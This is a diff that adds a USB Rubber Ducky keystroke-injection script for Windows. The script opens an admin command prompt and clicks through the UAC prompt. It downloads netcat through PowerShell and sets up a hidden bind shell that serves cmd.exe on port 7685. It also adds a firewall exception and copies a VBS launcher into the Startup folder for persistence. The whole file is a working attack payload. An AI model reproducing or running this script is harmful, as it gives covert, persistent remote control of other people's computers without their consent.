@@ -1,0 +1,84 @@
+DELAY 200
+REM --> Minimize all windows
+WINDOWS d
+DELAY 1000
+ESCAPE
+CONTROL ESCAPE
+DELAY 400
+STRING cmd
+DELAY 400
+CTRL-SHIFT ENTER
+DELAY 400
+ALT y
+DELAY 400
+STRING cd %USERPROFILE%
+ENTER
+
+REM --> Kills already running Netcat instance (if any)
+STRING TASKKILL /im nc.exe /f
+ENTER
+REM --> Delete nc.exe file if it already exists
+STRING erase /Q nc.exe
+ENTER
+REM --> Delete Start batch file if it already exists
+STRING erase /Q Start.bat
+ENTER
+REM --> Delete Invisible.vbs in temp folder, if it already exists
+STRING erase /Q invisible.vbs
+ENTER
+REM --> Delete invisible.vbs file in Startup if it already exists
+STRING erase /Q "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\invisible.vbs"
+ENTER
+DELAY 500
+
+REM --> Downloads NetCat
+STRING powershell (new-object System.Net.WebClient).DownloadFile('https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip','nc.zip')
+ENTER
+DELAY 5000
+STRING powershell Expand-Archive nc.zip
+ENTER
+DELAY 5000
+STRING cd %USERPROFILE%/nc/netcat-1.11
+ENTER
+DELAY 500
+
+REM --> Creates a batch file to start listening 
+STRING copy con Start.bat
+ENTER
+DELAY 200
+STRING nc -lp 7685 -vv -e cmd.exe -L
+ENTER
+DELAY 200
+CONTROL c
+ENTER
+
+REM --> Starts batch file invisibly 
+STRING copy con invisible.vbs
+ENTER
+DELAY 200
+STRING Set WshShell = CreateObject("WScript.Shell") 
+ENTER
+DELAY 200
+STRING WshShell.Run chr(34) & "%USERPROFILE%\nc\netcat-1.11\Start.bat" & Chr(34), 0 
+ENTER
+DELAY 200
+STRING Set WshShell = Nothing 
+ENTER
+DELAY 200
+CONTROL c
+ENTER
+DELAY 200
+REM --> Add netcat to allowed programs list, enabling it to communicate through the firewall seamlessly
+STRING netsh advfirewall firewall add rule name="Netcat" dir=in action=allow program="%USERPROFILE%\nc\netcat-1.11\nc.exe" enable=yes
+ENTER
+DELAY 200
+STRING start invisible.vbs
+ENTER
+DELAY 100
+
+REM --> Copies invisible.vbs to startup folder for persistence
+STRING copy "invisible.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+ENTER
+REM --> Kills CMD while nc.exe continues running in background, remove Ducky after CMD closes
+STRING exit 
+ENTER
